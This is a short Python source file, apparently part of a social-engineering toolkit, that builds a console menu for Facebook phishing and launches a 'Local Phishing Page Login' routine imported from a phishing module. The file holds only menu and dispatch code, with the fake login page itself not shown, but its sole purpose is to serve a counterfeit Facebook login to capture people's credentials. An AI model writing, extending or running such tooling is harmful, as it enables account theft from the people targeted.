from core.menu.social_engineering_attacks import *
from core.menu.sze import *
from ui.banner.custom import *

from modules.facebook.phishing.local_login_page import *

class Facebook:
    """ Facebook Menu Main Pages """
    def Phishing():
        Custom()
        Sze.introduce("Select phishing methods")
        Sze.addcolumn("0001", "Local Phishing Page Login")
        Sze.backcolumn()
        while True:
            x = input(f"{Style.ask} Pick One: ")
            if x == "0001":
                Facebook.localphishingpagelogin()
            elif x == "99":
                SocialEngineeringAttacks.facebook()
            else:
                Sze.invalidinput()

    def localphishingpagelogin():
        localloginpage()
